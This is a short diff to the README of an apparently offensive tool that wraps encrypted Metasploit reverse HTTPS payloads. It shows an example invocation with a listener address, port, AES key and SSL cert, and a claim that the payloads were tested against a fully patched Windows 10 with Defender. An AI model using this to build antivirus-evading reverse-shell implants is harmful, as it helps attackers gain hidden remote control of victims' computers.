@@ -6,7 +6,7 @@ Great code by fullmetalcache. I added options to use msf5 encrypt and use custom
 example:
 python mod_nice.py -a x64 -P https -l 127.0.0.1 -p 443 -e aes256 -k test123 -ssl msfkey.pem -s
 
-These are my testing steps, I tested both staged and stageless https on a fully patched Windows 10 running real-time and cloud-based protections all fully updated.
+These are my testing steps, I tested both staged and stageless https on a fully patched Windows 10 running Defender real-time and cloud-based protections all fully updated.
 
 1. Set up cert (obviously you can use other certs but I did not test that):
 After installing Letsencrypt you need to combine 2 keys to use for the reverse https payload, Letsencrypt stores them in /etc/letsencrypt/live/<yourdomain>/
